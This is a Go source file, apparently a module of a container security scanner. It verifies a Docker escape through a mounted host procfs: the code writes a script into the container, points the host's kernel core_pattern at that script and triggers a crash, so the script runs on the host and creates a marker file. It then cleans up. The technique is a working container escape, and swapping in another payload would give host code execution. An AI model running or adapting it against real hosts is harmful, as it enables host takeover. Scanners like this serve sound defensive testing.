package exp

import (
	"Container_runtime_scanner/internal/data"
	"Container_runtime_scanner/internal/docker"
	"fmt"
	"log"
	"regexp"
)

func Exploit_procfs(logger *log.Logger, cont *docker.Container) {
	logger.Println("挂载Docker procfs逃逸")
	flag := data.GenerateRandomString(6)

	cont.ShExecStep("printf \"#!/bin/sh\\ntouch /tmp/" + flag + "_procfs\\n\" > /tmp/procfs_exp")
	fmt.Println("printf \"#!/bin/sh\ntouch /tmp/" + flag + "_procfs\"")

	err := cont.CopyFileToContainerBase64("procfs_trigger", "/tmp/procfs_trigger")
	if err != nil {
		fmt.Println(err)
	}
	intermediate := cont.ShExecStep("cat /proc/mounts | xargs -d ',' -n 1 | grep workdir")
	container_hash := ExtractContainerHash(intermediate)
	cont.ShExecStep("printf \"|/var/lib/docker/overlay2/" + container_hash + "/merged/tmp/procfs_exp \\rcore    \" >  /host/proc/sys/kernel/core_pattern")
	fmt.Println("printf \"|/var/lib/docker/overlay2/" + container_hash + "/merged/tmp/procfs_exp \\rcore    \" >  /host/proc/sys/kernel/core_pattern")
	cont.ShExecStep("chmod +x /tmp/procfs_trigger")

	cont.Exec("sh", "-c", ". /tmp/procfs_trigger")

	if CheckFileExists("/tmp/"+flag+"_procfs") || CheckRemoteFileExists("/tmp/"+flag+"_procfs") {
		logger.Println("验证漏洞成功，并成功逃逸·")
	} else {
		logger.Println("逃逸失败")
	}

	logger.Println("删除测试记录")
	cont.ShExecStep("echo \"core\" > /proc/sys/kernel/core_pattern")
	cont.ShExecStep("rm -f /tmp/procfs_exp")
	cont.ShExecStep("rm -f /tmp/procfs_trigger")

	logger.Println("----------------------")

}
func ExtractContainerHash(path string) string {
	// 使用正则表达式匹配 overlay2/ 后面的哈希值
	// 哈希值通常是一串字母数字组合
	re := regexp.MustCompile(`overlay2/([a-f0-9]+)/`)

	// 查找匹配项
	matches := re.FindStringSubmatch(path)

	// 如果找到匹配项，返回捕获组中的哈希值
	if len(matches) >= 2 {
		return matches[1]
	}

	// 如果没有找到匹配项，返回空字符串
	return ""
}
